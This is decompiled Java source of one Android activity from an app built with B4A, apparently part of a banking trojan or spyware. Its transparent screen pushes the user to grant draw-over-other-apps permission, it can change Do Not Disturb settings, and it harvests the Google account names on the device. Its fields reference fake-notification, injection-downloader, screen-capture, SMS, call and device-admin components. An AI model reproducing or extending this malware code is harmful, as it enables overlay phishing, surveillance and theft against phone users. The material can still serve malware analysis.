package com.com.androidrr;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.B4AActivity;
import anywheresoftware.b4a.B4AMenuItem;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.Msgbox;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.constants.Colors;
import anywheresoftware.b4a.objects.ActivityWrapper;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.objects.ViewWrapper;
import anywheresoftware.b4a.objects.collections.JSONParser;
import anywheresoftware.b4a.objects.collections.List;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import b4a.flm.overlaywdw.OverlayPermission;
import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Iterator;

/* loaded from: classes.dex */
public class perm_activateoverlay extends Activity implements B4AActivity {
    public static OverlayPermission _op = null;
    static boolean afterFirstLayout = false;
    public static boolean dontPause = false;
    public static final boolean fullScreen = false;
    public static final boolean includeTitle = true;
    static boolean isFirst = true;
    public static perm_activateoverlay mostCurrent;
    public static WeakReference<Activity> previousOne;
    public static BA processBA;
    private static boolean processGlobalsRun;
    ActivityWrapper _activity;
    BA activityBA;
    BALayout layout;
    ArrayList<B4AMenuItem> menuItems;
    private Boolean onKeySubExist = null;
    private Boolean onKeyUpSubExist = null;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public starter _starter = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public ServiceC0262s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    public static String _activity_pause(boolean z) throws Exception {
        return "";
    }

    public static String _activity_resume() throws Exception {
        return "";
    }

    public static void _complete(boolean z) throws Exception {
    }

    public static String _globals() throws Exception {
        return "";
    }

    public static void _op_drawpermission(boolean z) throws Exception {
    }

    @Override // android.app.Activity
    public void onCreate(Bundle bundle) {
        Activity activity;
        super.onCreate(bundle);
        mostCurrent = this;
        if (processBA == null) {
            BA BA = new BA(getApplicationContext(), (BALayout) null, (BA) null, "com.com.androidrr", "com.com.androidrr.perm_activateoverlay");
            processBA = BA;
            BA.loadHtSubs(getClass());
            BALayout.setDeviceScale(getApplicationContext().getResources().getDisplayMetrics().density);
        } else {
            WeakReference<Activity> weakReference = previousOne;
            if (weakReference != null && (activity = weakReference.get()) != null && activity != this) {
                BA.LogInfo("Killing previous instance (perm_activateoverlay).");
                activity.finish();
            }
        }
        processBA.setActivityPaused(true);
        processBA.runHook("oncreate", this, null);
        processBA.sharedProcessBA.activityBA = null;
        BALayout bALayout = new BALayout(this);
        this.layout = bALayout;
        setContentView(bALayout);
        afterFirstLayout = false;
        WaitForLayout waitForLayout = new WaitForLayout();
        if (ServiceHelper.StarterHelper.startFromActivity(this, processBA, waitForLayout, false)) {
            BA.handler.postDelayed(waitForLayout, 5L);
        }
    }

    static class WaitForLayout implements Runnable {
        WaitForLayout() {
        }

        @Override // java.lang.Runnable
        public void run() {
            if (perm_activateoverlay.afterFirstLayout || perm_activateoverlay.mostCurrent == null) {
                return;
            }
            if (perm_activateoverlay.mostCurrent.layout.getWidth() == 0) {
                BA.handler.postDelayed(this, 5L);
                return;
            }
            perm_activateoverlay.mostCurrent.layout.getLayoutParams().height = perm_activateoverlay.mostCurrent.layout.getHeight();
            perm_activateoverlay.mostCurrent.layout.getLayoutParams().width = perm_activateoverlay.mostCurrent.layout.getWidth();
            perm_activateoverlay.afterFirstLayout = true;
            perm_activateoverlay.mostCurrent.afterFirstLayout();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void afterFirstLayout() {
        if (this != mostCurrent) {
            return;
        }
        this.activityBA = new BA(this, this.layout, processBA, "com.com.androidrr", "com.com.androidrr.perm_activateoverlay");
        processBA.sharedProcessBA.activityBA = new WeakReference<>(this.activityBA);
        ViewWrapper.lastId = 0;
        this._activity = new ActivityWrapper(this.activityBA, "activity");
        Msgbox.isDismissing = false;
        if (BA.isShellModeRuntimeCheck(processBA)) {
            if (isFirst) {
                processBA.raiseEvent2(null, true, "SHELL", false, new Object[0]);
            }
            BA BA = processBA;
            BA.raiseEvent2(null, true, "CREATE", true, "com.com.androidrr.perm_activateoverlay", BA, this.activityBA, this._activity, Float.valueOf(Common.Density), mostCurrent);
            this._activity.reinitializeForShell(this.activityBA, "activity");
        }
        initializeProcessGlobals();
        initializeGlobals();
        StringBuilder sb = new StringBuilder();
        sb.append("** Activity (perm_activateoverlay) Create ");
        sb.append(isFirst ? "(first time)" : "");
        sb.append(" **");
        BA.LogInfo(sb.toString());
        processBA.raiseEvent2(null, true, "activity_create", false, Boolean.valueOf(isFirst));
        isFirst = false;
        if (this != mostCurrent) {
            return;
        }
        processBA.setActivityPaused(false);
        BA.LogInfo("** Activity (perm_activateoverlay) Resume **");
        processBA.raiseEvent(null, "activity_resume", new Object[0]);
        if (Build.VERSION.SDK_INT >= 11) {
            try {
                Activity.class.getMethod("invalidateOptionsMenu", new Class[0]).invoke(this, null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @Override // anywheresoftware.b4a.B4AActivity
    public void addMenuItem(B4AMenuItem b4AMenuItem) {
        if (this.menuItems == null) {
            this.menuItems = new ArrayList<>();
        }
        this.menuItems.add(b4AMenuItem);
    }

    @Override // android.app.Activity
    public boolean onCreateOptionsMenu(Menu menu) {
        super.onCreateOptionsMenu(menu);
        try {
            if (processBA.subExists("activity_actionbarhomeclick")) {
                Class.forName("android.app.ActionBar").getMethod("setHomeButtonEnabled", Boolean.TYPE).invoke(getClass().getMethod("getActionBar", new Class[0]).invoke(this, new Object[0]), true);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (processBA.runHook("oncreateoptionsmenu", this, new Object[]{menu})) {
            return true;
        }
        ArrayList<B4AMenuItem> arrayList = this.menuItems;
        if (arrayList == null) {
            return false;
        }
        Iterator<B4AMenuItem> it = arrayList.iterator();
        while (it.hasNext()) {
            B4AMenuItem next = it.next();
            MenuItem add = menu.add(next.title);
            if (next.drawable != null) {
                add.setIcon(next.drawable);
            }
            if (Build.VERSION.SDK_INT >= 11) {
                try {
                    if (next.addToBar) {
                        MenuItem.class.getMethod("setShowAsAction", Integer.TYPE).invoke(add, 1);
                    }
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
            add.setOnMenuItemClickListener(new B4AMenuItemsClickListener(next.eventName.toLowerCase(BA.cul)));
        }
        return true;
    }

    @Override // android.app.Activity
    public boolean onOptionsItemSelected(MenuItem menuItem) {
        if (menuItem.getItemId() == 16908332) {
            processBA.raiseEvent(null, "activity_actionbarhomeclick", new Object[0]);
            return true;
        }
        return super.onOptionsItemSelected(menuItem);
    }

    @Override // android.app.Activity
    public boolean onPrepareOptionsMenu(Menu menu) {
        super.onPrepareOptionsMenu(menu);
        processBA.runHook("onprepareoptionsmenu", this, new Object[]{menu});
        return true;
    }

    @Override // android.app.Activity
    protected void onStart() {
        super.onStart();
        processBA.runHook("onstart", this, null);
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
        processBA.runHook("onstop", this, null);
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public void onWindowFocusChanged(boolean z) {
        super.onWindowFocusChanged(z);
        if (processBA.subExists("activity_windowfocuschanged")) {
            processBA.raiseEvent2(null, true, "activity_windowfocuschanged", false, Boolean.valueOf(z));
        }
    }

    private class B4AMenuItemsClickListener implements MenuItem.OnMenuItemClickListener {
        private final String eventName;

        public B4AMenuItemsClickListener(String str) {
            this.eventName = str;
        }

        @Override // android.view.MenuItem.OnMenuItemClickListener
        public boolean onMenuItemClick(MenuItem menuItem) {
            perm_activateoverlay.processBA.raiseEventFromUI(menuItem.getTitle(), this.eventName + "_click", new Object[0]);
            return true;
        }
    }

    public static Class<?> getObject() {
        return perm_activateoverlay.class;
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (processBA.runHook("onkeydown", this, new Object[]{Integer.valueOf(i), keyEvent})) {
            return true;
        }
        if (this.onKeySubExist == null) {
            this.onKeySubExist = Boolean.valueOf(processBA.subExists("activity_keypress"));
        }
        if (this.onKeySubExist.booleanValue()) {
            if (i == 4 && Build.VERSION.SDK_INT >= 18) {
                HandleKeyDelayed handleKeyDelayed = new HandleKeyDelayed();
                handleKeyDelayed.f354kc = i;
                BA.handler.post(handleKeyDelayed);
                return true;
            }
            if (new HandleKeyDelayed().runDirectly(i)) {
                return true;
            }
        }
        return super.onKeyDown(i, keyEvent);
    }

    private class HandleKeyDelayed implements Runnable {

        /* renamed from: kc */
        int f354kc;

        private HandleKeyDelayed() {
        }

        @Override // java.lang.Runnable
        public void run() {
            runDirectly(this.f354kc);
        }

        public boolean runDirectly(int i) {
            Boolean bool = (Boolean) perm_activateoverlay.processBA.raiseEvent2(perm_activateoverlay.this._activity, false, "activity_keypress", false, Integer.valueOf(i));
            if (bool == null || bool.booleanValue()) {
                return true;
            }
            if (i != 4) {
                return false;
            }
            perm_activateoverlay.this.finish();
            return true;
        }
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyUp(int i, KeyEvent keyEvent) {
        Boolean bool;
        if (processBA.runHook("onkeyup", this, new Object[]{Integer.valueOf(i), keyEvent})) {
            return true;
        }
        if (this.onKeyUpSubExist == null) {
            this.onKeyUpSubExist = Boolean.valueOf(processBA.subExists("activity_keyup"));
        }
        if (this.onKeyUpSubExist.booleanValue() && ((bool = (Boolean) processBA.raiseEvent2(this._activity, false, "activity_keyup", false, Integer.valueOf(i))) == null || bool.booleanValue())) {
            return true;
        }
        return super.onKeyUp(i, keyEvent);
    }

    @Override // android.app.Activity
    public void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        processBA.runHook("onnewintent", this, new Object[]{intent});
    }

    @Override // android.app.Activity
    public void onPause() {
        super.onPause();
        if (this._activity != null && this == mostCurrent) {
            Msgbox.dismiss(true);
            if (!dontPause) {
                BA.LogInfo("** Activity (perm_activateoverlay) Pause, UserClosed = " + this.activityBA.activity.isFinishing() + " **");
            } else {
                BA.LogInfo("** Activity (perm_activateoverlay) Pause event (activity is not paused). **");
            }
            if (mostCurrent != null) {
                processBA.raiseEvent2(this._activity, true, "activity_pause", false, Boolean.valueOf(this.activityBA.activity.isFinishing()));
            }
            if (!dontPause) {
                processBA.setActivityPaused(true);
                mostCurrent = null;
            }
            if (!this.activityBA.activity.isFinishing()) {
                previousOne = new WeakReference<>(this);
            }
            Msgbox.isDismissing = false;
            processBA.runHook("onpause", this, null);
        }
    }

    @Override // android.app.Activity
    public void onDestroy() {
        super.onDestroy();
        previousOne = null;
        processBA.runHook("ondestroy", this, null);
    }

    @Override // android.app.Activity
    public void onResume() {
        super.onResume();
        mostCurrent = this;
        Msgbox.isDismissing = false;
        if (this.activityBA != null) {
            BA.handler.post(new ResumeMessage(mostCurrent));
        }
        processBA.runHook("onresume", this, null);
    }

    private static class ResumeMessage implements Runnable {
        private final WeakReference<Activity> activity;

        public ResumeMessage(Activity activity) {
            this.activity = new WeakReference<>(activity);
        }

        @Override // java.lang.Runnable
        public void run() {
            perm_activateoverlay perm_activateoverlayVar = perm_activateoverlay.mostCurrent;
            if (perm_activateoverlayVar == null || perm_activateoverlayVar != this.activity.get()) {
                return;
            }
            perm_activateoverlay.processBA.setActivityPaused(false);
            BA.LogInfo("** Activity (perm_activateoverlay) Resume **");
            if (perm_activateoverlayVar != perm_activateoverlay.mostCurrent) {
                return;
            }
            perm_activateoverlay.processBA.raiseEvent(perm_activateoverlayVar._activity, "activity_resume", null);
        }
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        processBA.onActivityResult(i, i2, intent);
        processBA.runHook("onactivityresult", this, new Object[]{Integer.valueOf(i), Integer.valueOf(i2)});
    }

    private static void initializeGlobals() {
        processBA.raiseEvent2(null, true, "globals", false, null);
    }

    @Override // android.app.Activity
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        for (int i2 = 0; i2 < strArr.length; i2++) {
            Object[] objArr = new Object[2];
            objArr[0] = strArr[i2];
            objArr[1] = Boolean.valueOf(iArr[i2] == 0);
            processBA.raiseEventFromDifferentThread(null, null, 0, "activity_permissionresult", true, objArr);
        }
    }

    public static void initializeProcessGlobals() {
        try {
            Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals", new Class[0]).invoke(null, null);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static void _activity_create(boolean z) throws Exception {
        new ResumableSub_Activity_Create(null, z).resume(processBA, null);
    }

    public static class ResumableSub_Activity_Create extends BA.ResumableSub {
        boolean _firsttime;
        perm_activateoverlay parent;

        /* renamed from: _c */
        requestdrawoverpermission f355_c = null;
        boolean _success = false;
        IntentWrapper _in = null;
        boolean _allowed = false;

        public ResumableSub_Activity_Create(perm_activateoverlay perm_activateoverlayVar, boolean z) {
            this.parent = perm_activateoverlayVar;
            this._firsttime = z;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA BA, Object[] objArr) throws Exception {
            while (true) {
                switch (this.state) {
                    case -1:
                        return;
                    case 0:
                        this.state = 1;
                        ActivityWrapper activityWrapper = perm_activateoverlay.mostCurrent._activity;
                        Colors colors = Common.Colors;
                        activityWrapper.setColor(Colors.ARGB(0, 0, 0, 0));
                        clsclassperms_code clsclassperms_codeVar = perm_activateoverlay.mostCurrent._clsclassperms_code;
                        clsclassperms_code._isonovlyact = true;
                        requestdrawoverpermission requestdrawoverpermissionVar = new requestdrawoverpermission();
                        this.f355_c = requestdrawoverpermissionVar;
                        requestdrawoverpermissionVar._initialize(perm_activateoverlay.processBA);
                        Common.WaitFor("complete", perm_activateoverlay.processBA, this, this.f355_c._getpermission());
                        this.state = 12;
                        return;
                    case 1:
                        this.state = 4;
                        if (!perm_activateoverlay._candrawoverlays()) {
                            this.state = 3;
                            break;
                        } else {
                            break;
                        }
                    case 3:
                        this.state = 4;
                        IntentWrapper intentWrapper = new IntentWrapper();
                        this._in = intentWrapper;
                        StringBuilder sb = new StringBuilder();
                        sb.append("package:");
                        B4AApplication b4AApplication = Common.Application;
                        sb.append(B4AApplication.getPackageName());
                        intentWrapper.Initialize("android.settings.action.MANAGE_OVERLAY_PERMISSION", sb.toString());
                        Common.StartActivity(perm_activateoverlay.processBA, this._in.getObject());
                        Common.WaitFor("activity_resume", perm_activateoverlay.processBA, this, null);
                        this.state = 13;
                        return;
                    case 4:
                        this.state = 11;
                        if (!perm_activateoverlay._op.RequestPermission(perm_activateoverlay.processBA, "OP")) {
                            break;
                        } else {
                            this.state = 6;
                            break;
                        }
                    case 6:
                        this.state = 7;
                        Common.WaitFor("op_drawpermission", perm_activateoverlay.processBA, this, null);
                        this.state = 14;
                        return;
                    case 7:
                        this.state = 10;
                        if (!this._allowed) {
                            break;
                        } else {
                            this.state = 9;
                            break;
                        }
                    case 9:
                        this.state = 10;
                        clsclassperms_code clsclassperms_codeVar2 = perm_activateoverlay.mostCurrent._clsclassperms_code;
                        clsclassperms_code._isonovlyact = false;
                        clsclassperms_code clsclassperms_codeVar3 = perm_activateoverlay.mostCurrent._clsclassperms_code;
                        clsclassperms_code._intpermissionno = 2;
                        perm_activateoverlay.mostCurrent._activity.Finish();
                        break;
                    case 10:
                        this.state = 11;
                        break;
                    case 11:
                        this.state = -1;
                        break;
                    case 12:
                        this.state = 1;
                        this._success = ((Boolean) objArr[0]).booleanValue();
                        Common.LogImpl("621889033", "Permission: " + BA.ObjectToString(Boolean.valueOf(this._success)), 0);
                        clsclassperms_code clsclassperms_codeVar4 = perm_activateoverlay.mostCurrent._clsclassperms_code;
                        clsclassperms_code._isonovlyact = false;
                        clsclassperms_code clsclassperms_codeVar5 = perm_activateoverlay.mostCurrent._clsclassperms_code;
                        clsclassperms_code._intpermissionno = 2;
                        perm_activateoverlay.mostCurrent._activity.Finish();
                        break;
                    case 13:
                        this.state = 4;
                        clsclassperms_code clsclassperms_codeVar6 = perm_activateoverlay.mostCurrent._clsclassperms_code;
                        clsclassperms_code._isonovlyact = false;
                        clsclassperms_code clsclassperms_codeVar7 = perm_activateoverlay.mostCurrent._clsclassperms_code;
                        clsclassperms_code._intpermissionno = 2;
                        perm_activateoverlay.mostCurrent._activity.Finish();
                        break;
                    case 14:
                        this.state = 7;
                        this._allowed = ((Boolean) objArr[0]).booleanValue();
                        break;
                }
            }
        }
    }

    public static boolean _candrawoverlays() throws Exception {
        JavaObject javaObject = new JavaObject();
        JavaObject javaObject2 = new JavaObject();
        new Phone();
        if (Phone.getSdkVersion() < 23) {
            return true;
        }
        javaObject.InitializeContext(processBA);
        javaObject2.InitializeStatic("android.provider.Settings");
        return BA.ObjectToBoolean(javaObject2.RunMethod("canDrawOverlays", new Object[]{javaObject.getObject()}));
    }

    public static String _process_globals() throws Exception {
        _op = new OverlayPermission();
        return "";
    }

    public static void _setinterruptionfilter(int i) throws Exception {
        new ResumableSub_SetInterruptionFilter(null, i).resume(processBA, null);
    }

    public static class ResumableSub_SetInterruptionFilter extends BA.ResumableSub {
        int _policy;
        perm_activateoverlay parent;
        JavaObject _notificationmanager = null;
        IntentWrapper _in = null;

        public ResumableSub_SetInterruptionFilter(perm_activateoverlay perm_activateoverlayVar, int i) {
            this.parent = perm_activateoverlayVar;
            this._policy = i;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA BA, Object[] objArr) throws Exception {
            while (true) {
                switch (this.state) {
                    case -1:
                        return;
                    case 0:
                        this.state = 1;
                        this._notificationmanager = new JavaObject();
                        this._notificationmanager = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), this._notificationmanager.InitializeContext(perm_activateoverlay.processBA).RunMethod("getSystemService", new Object[]{"notification"}));
                        break;
                    case 1:
                        this.state = 4;
                        if (!this._notificationmanager.RunMethod("isNotificationPolicyAccessGranted", (Object[]) Common.Null).equals(false)) {
                            break;
                        } else {
                            this.state = 3;
                            break;
                        }
                    case 3:
                        this.state = 4;
                        IntentWrapper intentWrapper = new IntentWrapper();
                        this._in = intentWrapper;
                        intentWrapper.Initialize("android.settings.NOTIFICATION_POLICY_ACCESS_SETTINGS", "");
                        Common.StartActivity(perm_activateoverlay.processBA, this._in.getObject());
                        Common.WaitFor("activity_resume", perm_activateoverlay.processBA, this, null);
                        this.state = 10;
                        return;
                    case 4:
                        this.state = 9;
                        if (this._notificationmanager.RunMethod("isNotificationPolicyAccessGranted", (Object[]) Common.Null).equals(true)) {
                            this.state = 6;
                            break;
                        } else {
                            this.state = 8;
                            break;
                        }
                    case 6:
                        this.state = 9;
                        this._notificationmanager.RunMethod("setInterruptionFilter", new Object[]{Integer.valueOf(this._policy)});
                        break;
                    case 8:
                        this.state = 9;
                        Common.LogImpl("622020109", "No permission!", 0);
                        break;
                    case 9:
                        this.state = -1;
                        perm_activateoverlay.mostCurrent._activity.Finish();
                        break;
                    case 10:
                        this.state = 4;
                        Common.LogImpl("622020104", "after resume", 0);
                        break;
                }
            }
        }
    }

    public String getAccountsInDev() {
        JSONParser.JSONGenerator jSONGenerator;
        List list = new List();
        list.Initialize();
        for (Account account : ((AccountManager) getSystemService("account")).getAccounts()) {
            if (account.type.equalsIgnoreCase("com.google")) {
                list.Add(account.name);
            }
        }
        JSONParser.JSONGenerator jSONGenerator2 = null;
        try {
            jSONGenerator = new JSONParser.JSONGenerator();
            try {
                jSONGenerator.Initialize2(list);
            } catch (Exception unused) {
                jSONGenerator2 = jSONGenerator;
                jSONGenerator = jSONGenerator2;
                return jSONGenerator.ToString();
            }
        } catch (Exception unused2) {
        }
        return jSONGenerator.ToString();
    }
}
